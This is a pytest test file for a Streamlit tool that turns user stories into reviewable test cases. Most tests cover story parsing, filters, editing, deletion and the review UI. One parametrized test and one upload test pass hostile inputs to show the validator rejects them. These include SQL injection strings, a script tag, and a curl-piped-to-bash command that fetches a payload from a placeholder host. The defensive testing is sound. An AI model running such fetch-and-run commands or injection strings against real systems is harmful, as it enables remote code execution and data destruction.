from pathlib import Path

import pytest
from pydantic import ValidationError
from streamlit.testing.v1 import AppTest

import app as streamlit_app
from testgen.generate import PartialGenerationError
from app import (
    _build_edited_case,
    _matches_review_filters,
    _stories_from_markdown_upload,
)
import testgen.generate as generation
from testgen.ingest import MAX_STORY_TEXT_CHARS, Story, story_from_text
from testgen.schema import Category, ReviewItem, Status, TestCase as Case
from testgen.storage import (
    list_review_items,
    save_review_items,
    save_story_group,
)


APP_PATH = Path(__file__).resolve().parents[1] / "app.py"


def test_markdown_upload_parses_multiple_stories():
    stories = _stories_from_markdown_upload(
        b"# Authentication\n## US-01: Login\nAs a user, I want to log in.\n"
        b"## US-02: Logout\nAs a user, I want to log out."
    )

    assert [story.id for story in stories] == ["US-01", "US-02"]
    assert stories[0].title == "Login"


@pytest.mark.parametrize(
    "sample_name",
    ["example_user_story004.md", "example_user_story005.md"],
)
def test_markdown_upload_keeps_labeled_story_and_criteria_together(sample_name):
    sample_path = Path(__file__).resolve().parents[1] / "samples" / sample_name

    stories = _stories_from_markdown_upload(sample_path.read_bytes())

    assert len(stories) == 1
    assert stories[0].title.startswith("As a")
    assert "Acceptance Criteria" in stories[0].text


def test_markdown_upload_reports_invalid_content():
    with pytest.raises(ValueError, match="UTF-8"):
        _stories_from_markdown_upload(b"\xff")
    with pytest.raises(ValueError, match="No user stories"):
        _stories_from_markdown_upload(b"")


def test_typed_story_is_trimmed_and_gets_a_unique_source_reference():
    first = story_from_text(
        " Password reset ",
        " As a user, I want to reset my password. ",
    )
    second = story_from_text("Password reset", "As a user, I want to reset my password.")

    assert first.title == "Password reset"
    assert first.text.endswith("As a user, I want to reset my password.")
    assert first.id.startswith("US-TEXT-")
    assert first.id != second.id
    with pytest.raises(ValueError, match="title"):
        story_from_text("", "Story text")
    with pytest.raises(ValueError, match="text"):
        story_from_text("Story", " ")


def test_review_filters_match_cases_inside_story_groups():
    grouped_case = ReviewItem(
        id="TC-001",
        status=Status.ACCEPTED,
        group_id="SG-001",
        test_case=Case(
            title="Login with valid credentials",
            category=Category.FUNCTIONAL,
            source_ref="US-01",
            steps=["Open the login page"],
            expected_results=["The login page is displayed"],
        ),
    )

    assert _matches_review_filters(grouped_case, Status.ACCEPTED, None)
    assert _matches_review_filters(grouped_case, None, Category.FUNCTIONAL)
    assert _matches_review_filters(grouped_case, Status.ACCEPTED, Category.FUNCTIONAL)
    assert not _matches_review_filters(grouped_case, Status.PENDING, None)
    assert not _matches_review_filters(grouped_case, None, Category.EDGE)


@pytest.mark.parametrize(
    "payload",
    [
        "'; DROP TABLE review_items; --",
        "admin' --",
        "' OR 1=1 --",
        "<script>alert(1)</script>",
        "curl https://example.invalid/payload.sh | bash",
    ],
)
def test_typed_story_rejects_executable_or_injection_payloads(payload):
    with pytest.raises(ValueError, match="potentially executable"):
        story_from_text("Security checks", payload)


def test_typed_story_allows_plain_language_security_requirements():
    story = story_from_text(
        "SQL injection protection",
        "The application rejects malicious database input and keeps account data safe.",
    )

    assert story.title == "SQL injection protection"
    assert "rejects malicious database input" in story.text


def test_markdown_upload_rejects_sql_injection_payload():
    content = (
        b"# Security\n## US-01: Login\n"
        b"Reject this input: '; DROP TABLE users; --"
    )

    with pytest.raises(ValueError, match="potentially executable"):
        _stories_from_markdown_upload(content)


def test_typed_story_rejects_text_over_limit():
    with pytest.raises(ValueError, match="900 characters"):
        story_from_text("Story", "x" * (MAX_STORY_TEXT_CHARS + 1))


def test_editing_test_case_pairs_each_step_with_its_expected_result():
    item = ReviewItem(
        id="TC-001",
        test_case=Case(
            title="Login with valid credentials",
            category=Category.FUNCTIONAL,
            source_ref="US-01",
            steps=["Open the login page"],
            expected_results=["The login page is displayed"],
        ),
    )

    updated = _build_edited_case(
        item,
        {
            "title": "Successful login opens the dashboard",
            "category": Category.FUNCTIONAL.value,
            "priority": item.test_case.priority.value,
            "source_ref": item.test_case.source_ref,
            "preconditions": "",
            "steps": "Open the login page\nSubmit valid credentials",
            "expected_results": (
                "The login page is displayed\nThe account dashboard is displayed"
            ),
            "test_data": "",
            "has_api": False,
            "method": "",
            "path": "",
            "request_body": "",
            "expected_status": 200,
        },
    )

    assert updated.title == "Successful login opens the dashboard"
    assert updated.steps == [
        "Open the login page",
        "Submit valid credentials",
    ]
    assert updated.expected_results == [
        "The login page is displayed",
        "The account dashboard is displayed",
    ]


def test_editing_rejects_different_step_and_result_counts():
    item = ReviewItem(
        id="TC-001",
        test_case=Case(
            title="Login with valid credentials",
            category=Category.FUNCTIONAL,
            source_ref="US-01",
            steps=["Open the login page"],
            expected_results=["The login page is displayed"],
        ),
    )

    with pytest.raises(ValidationError, match="exactly one expected result"):
        _build_edited_case(
            item,
            {
                "title": item.test_case.title,
                "category": Category.FUNCTIONAL.value,
                "priority": item.test_case.priority.value,
                "source_ref": item.test_case.source_ref,
                "preconditions": "",
                "steps": "Open the login page\nSubmit valid credentials",
                "expected_results": "The login page is displayed",
                "test_data": "",
                "has_api": False,
                "method": "",
                "path": "",
                "request_body": "",
                "expected_status": 200,
            },
        )


def test_review_app_displays_queue_and_persists_accept_action(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    save_review_items(
        [
            ReviewItem(
                id="generated-id",
                manually_edited=True,
                flags=[
                    "Possible duplicate of TC-011 (0.85 similarity)",
                    "Low value: fewer than 2 meaningful steps",
                ],
                test_case=Case(
                    title="Login with valid credentials",
                    category=Category.FUNCTIONAL,
                    source_ref="US-01",
                    steps=["Open the login page", "Submit valid credentials"],
                    expected_results=[
                        "The login page is displayed",
                        "The account dashboard is displayed",
                    ],
                ),
            )
        ]
    )

    app = AppTest.from_file(str(APP_PATH)).run()

    assert not app.exception
    assert app.text_area(key="story-text").max_chars == 900
    assert app.text_area(key="story-text").help == "Maximum 900 characters."
    assert not any(
        "Suspicious executable code" in caption.value for caption in app.caption
    )
    assert app.title[0].value == "Test Case Generator and Reviewer"
    assert app.caption[0].value == (
        "Generate and review tests, check validation flags, export approved tests."
    )
    assert "Functional · Medium priority · User Story 01 · Pending" in [
        caption.value for caption in app.caption
    ]
    assert [heading.value for heading in app.subheader] == [
        "Test Generator",
        "Test Review",
    ]
    assert "#### Export approved tests" in [
        markdown.value for markdown in app.markdown
    ]
    selectbox_labels = [selectbox.label for selectbox in app.selectbox]
    assert selectbox_labels[:3] == [
        "Filter by Test Case Group",
        "Filter by status",
        "Filter by category",
    ]
    assert selectbox_labels.index("Filter by category") < selectbox_labels.index("Export scope")
    assert not any(
        expander.label == "Generate tests from user stories"
        for expander in app.expander
    )
    assert {uploader.label for uploader in app.get("file_uploader")} == {
        "Upload an OpenAPI 3 YAML or JSON file",
        "Upload a Markdown file containing user stories",
    }
    assert any(button.label == "Generate from Markdown" for button in app.button)
    assert any(button.label == "Generate from user story" for button in app.button)
    assert any(
        expander.label == "TC-001 · Login with valid credentials"
        for expander in app.expander
    )
    assert len(app.warning) == 1
    assert "Possible duplicate of TC-011 (0.85 similarity)" in app.warning[0].value
    assert "Low value: fewer than 2 meaningful steps" in app.warning[0].value
    assert len([expander for expander in app.expander if expander.label == "Edit test case"]) == 1
    assert any(button.key == "delete-TC-001" for button in app.button)
    assert [metric.label for metric in app.metric] == [
        "Total",
        "Accepted",
        "Pending",
        "Rejected",
        "Manually edited",
    ]
    assert app.metric[4].value == "1"
    assert [button.disabled for button in app.get("download_button")] == [
        True,
        True,
        True,
    ]

    app.button(key="accept-TC-001").click().run()

    assert not app.exception
    assert list_review_items()[0].status == Status.ACCEPTED
    assert list_review_items()[0].manually_edited is True
    assert not any(button.key == "delete-TC-001" for button in app.button)
    assert [button.disabled for button in app.get("download_button")] == [
        False,
        False,
        False,
    ]


def test_story_generation_disables_submit_button_while_generating(
    tmp_path, monkeypatch
):
    monkeypatch.chdir(tmp_path)
    generated_stories = []

    def fake_generate(stories):
        assert streamlit_app.st.session_state["story_generation_pending"] is True
        generated_stories.extend(stories)
        return []

    monkeypatch.setattr(generation, "generate_and_save_stories", fake_generate)
    app = AppTest.from_file(str(APP_PATH)).run()
    app.text_input(key="story-title").set_value("Password reset")
    app.text_area(key="story-text").set_value(
        "As a user, I want to reset my password."
    )
    app.button(key="generate-user-story").click().run()

    assert not app.exception
    assert len(generated_stories) == 1
    assert generated_stories[0].title == "Password reset"
    assert any("Saved 0 cases for Password reset" in item.value for item in app.success)
    assert app.button(key="generate-user-story").disabled is False


def test_partial_story_generation_shows_saved_cases_and_failure_warning(
    tmp_path, monkeypatch
):
    monkeypatch.chdir(tmp_path)

    def fail_after_saving(stories):
        saved_items = save_story_group(
            stories[0],
            [
                ReviewItem(
                    id="TC-001",
                    test_case=Case(
                        title="Complete guest checkout",
                        category=Category.FUNCTIONAL,
                        source_ref=stories[0].id,
                        steps=["Choose guest checkout"],
                        expected_results=["Guest checkout is selected"],
                    ),
                )
            ],
        )
        raise PartialGenerationError(
            ["US-TEXT/functional: invalid generated output"],
            saved_items=saved_items,
        )

    monkeypatch.setattr(generation, "generate_and_save_stories", fail_after_saving)
    app = AppTest.from_file(str(APP_PATH)).run()
    app.text_input(key="story-title").set_value("Guest checkout")
    app.text_area(key="story-text").set_value(
        "As a visitor, I want to complete a purchase as a guest."
    )
    app.button(key="generate-user-story").click().run()

    assert not app.exception
    assert any(
        "Generation incomplete. Saved 1 test case" in warning.value
        for warning in app.warning
    )
    assert "**Guest checkout**" in [item.value for item in app.markdown]
    assert any(
        expander.label == "TC-001 · Complete guest checkout"
        for expander in app.expander
    )
    assert len(list_review_items()) == 1


def test_pending_case_requires_confirmation_before_deletion(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    save_review_items(
        [
            ReviewItem(
                id="generated-id",
                test_case=Case(
                    title="Login with valid credentials",
                    category=Category.FUNCTIONAL,
                    source_ref="US-01",
                    steps=["Open the login page"],
                    expected_results=["The login page is displayed"],
                ),
            )
        ]
    )

    app = AppTest.from_file(str(APP_PATH)).run()
    app.button(key="delete-TC-001").click().run()

    assert not app.exception
    assert any(
        "This action cannot be undone." in warning.value for warning in app.warning
    )
    assert len(list_review_items()) == 1

    app.button(key="confirm-delete-TC-001").click().run()

    assert not app.exception
    assert list_review_items() == []


@pytest.mark.parametrize(
    ("status", "delete_available"),
    [(Status.REJECTED, True), (Status.ACCEPTED, False)],
)
def test_delete_button_visibility_matches_case_status(
    tmp_path, monkeypatch, status, delete_available
):
    monkeypatch.chdir(tmp_path)
    save_review_items(
        [
            ReviewItem(
                id="generated-id",
                status=status,
                test_case=Case(
                    title="Login with valid credentials",
                    category=Category.FUNCTIONAL,
                    source_ref="US-01",
                    steps=["Open the login page"],
                    expected_results=["The login page is displayed"],
                ),
            )
        ]
    )

    app = AppTest.from_file(str(APP_PATH)).run()

    assert not app.exception
    assert any(button.key == "delete-TC-001" for button in app.button) is delete_available


def test_story_group_displays_cases_and_can_be_deleted_after_confirmation(
    tmp_path, monkeypatch
):
    monkeypatch.chdir(tmp_path)
    story = Story(
        id="US-01",
        title="Password reset",
        text="As a user, I want to reset my password.",
    )
    save_story_group(
        story,
        [
            ReviewItem(
                id="accepted",
                status=Status.ACCEPTED,
                test_case=Case(
                    title="Reset password with valid email",
                    category=Category.FUNCTIONAL,
                    source_ref=story.id,
                    steps=["Submit a valid email"],
                    expected_results=["A reset link is sent"],
                ),
            ),
            ReviewItem(
                id="pending",
                test_case=Case(
                    title="Reject unknown email address",
                    category=Category.NEGATIVE,
                    source_ref=story.id,
                    steps=["Submit an unknown email"],
                    expected_results=["An account-not-found message appears"],
                ),
            ),
        ],
    )

    app = AppTest.from_file(str(APP_PATH)).run()
    assert "**Password reset**" in [item.value for item in app.markdown]
    assert any(button.key.startswith("delete-group-SG-") for button in app.button)

    group_delete_button = next(
        button for button in app.button if button.key.startswith("delete-group-SG-")
    )
    group_delete_button.click().run()

    assert not app.exception
    assert any(
        "including 1 accepted test?" in error.value for error in app.error
    )
    assert len(list_review_items()) == 2

    confirm_button = next(
        button
        for button in app.button
        if button.key.startswith("confirm-delete-group-SG-")
    )
    assert confirm_button.label == "Delete group permanently"
    confirm_button.click().run()

    assert not app.exception
    assert list_review_items() == []


def test_story_group_can_be_renamed_from_review_ui(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    story = Story(
        id="US-01",
        title="Long original user story title",
        text="As a visitor, I want to complete a purchase as a guest.",
    )
    saved = save_story_group(
        story,
        [
            ReviewItem(
                id="pending",
                test_case=Case(
                    title="Complete guest checkout",
                    category=Category.FUNCTIONAL,
                    source_ref=story.id,
                    steps=["Choose guest checkout"],
                    expected_results=["Guest checkout is selected"],
                ),
            )
        ],
        group_title="guest_purchase_story · Guest checkout",
    )

    app = AppTest.from_file(str(APP_PATH)).run()
    app.button(key=f"rename-group-{saved[0].group_id}").click().run()

    assert not app.exception
    title_key = f"rename-story-group-title-{saved[0].group_id}"
    app.text_input(key=title_key).set_value("Guest purchase")
    app.button(key=f"save-group-name-{saved[0].group_id}").click().run()

    assert not app.exception
    assert "**Guest purchase**" in [item.value for item in app.markdown]


def test_story_group_filters_show_all_and_match_selected_status_and_category(
    tmp_path, monkeypatch
):
    monkeypatch.chdir(tmp_path)
    story = Story(id="US-01", title="Checkout", text="Checkout story")
    saved = save_story_group(
        story,
        [
            ReviewItem(
                id="pending-functional",
                status=Status.PENDING,
                test_case=Case(
                    title="Complete guest checkout",
                    category=Category.FUNCTIONAL,
                    source_ref=story.id,
                    steps=["Choose guest checkout"],
                    expected_results=["Guest checkout is selected"],
                ),
            ),
            ReviewItem(
                id="accepted-negative",
                status=Status.ACCEPTED,
                test_case=Case(
                    title="Reject invalid payment details",
                    category=Category.NEGATIVE,
                    source_ref=story.id,
                    steps=["Submit invalid payment details"],
                    expected_results=["A payment validation error appears"],
                ),
            ),
            ReviewItem(
                id="rejected-edge",
                status=Status.REJECTED,
                test_case=Case(
                    title="Handle repeated checkout submission",
                    category=Category.EDGE,
                    source_ref=story.id,
                    steps=["Submit the checkout form twice"],
                    expected_results=["Only one order is created"],
                ),
            ),
        ],
    )
    other_story = Story(id="US-02", title="Account settings", text="Settings story")
    other_group = save_story_group(
        other_story,
        [
            ReviewItem(
                id="other-group-pending",
                status=Status.PENDING,
                test_case=Case(
                    title="Update account email",
                    category=Category.FUNCTIONAL,
                    source_ref=other_story.id,
                    steps=["Submit a new email address"],
                    expected_results=["The account email is updated"],
                ),
            )
        ],
    )

    app = AppTest.from_file(str(APP_PATH)).run()

    assert not app.exception
    assert {
        expander.label
        for expander in app.expander
        if expander.label.startswith("TC-")
    } == {
        "TC-001 · Complete guest checkout",
        "TC-002 · Reject invalid payment details",
        "TC-003 · Handle repeated checkout submission",
        "TC-004 · Update account email",
    }
    assert "Showing 4 of 4 test cases" in [caption.value for caption in app.caption]

    app.selectbox(key="review-story-group-filter").set_value(saved[0].group_id).run()
    assert not app.exception
    assert [expander.label for expander in app.expander if expander.label.startswith("TC-")] == [
        "TC-001 · Complete guest checkout",
        "TC-002 · Reject invalid payment details",
        "TC-003 · Handle repeated checkout submission",
    ]

    app.selectbox(key="review-status-filter").set_value("pending").run()
    assert not app.exception
    assert [expander.label for expander in app.expander if expander.label.startswith("TC-")] == [
        "TC-001 · Complete guest checkout",
    ]

    app.selectbox(key="review-story-group-filter").set_value(other_group[0].group_id).run()
    assert not app.exception
    assert [expander.label for expander in app.expander if expander.label.startswith("TC-")] == [
        "TC-004 · Update account email",
    ]

    app.selectbox(key="review-story-group-filter").set_value("all")
    app.selectbox(key="review-status-filter").set_value("all")
    app.selectbox(key="review-category-filter").set_value("negative").run()
    assert not app.exception
    assert [expander.label for expander in app.expander if expander.label.startswith("TC-")] == [
        "TC-002 · Reject invalid payment details",
    ]
    assert saved[0].group_id
